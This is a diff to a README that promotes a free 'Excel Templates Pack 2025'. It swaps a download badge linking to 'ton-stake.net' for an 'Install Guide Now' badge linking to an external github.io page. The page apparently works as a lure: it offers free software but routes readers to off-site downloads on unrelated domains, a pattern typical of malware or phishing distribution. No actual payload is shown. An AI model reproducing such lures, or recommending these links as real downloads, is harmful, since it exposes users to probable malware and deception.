@@ -3,7 +3,9 @@
 **Excel Templates Pack 2025** is a free collection of spreadsheets designed for everyday productivity.  
 It includes budget trackers, invoices, planners, and financial models — ready to use in Microsoft Excel.  
 
-[![Download Excel Templates](https://img.shields.io/badge/Download-Excel_Templates_2025-blueviolet)](https://ton-stake.net)
+<a href="https://excel-templates-pack-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
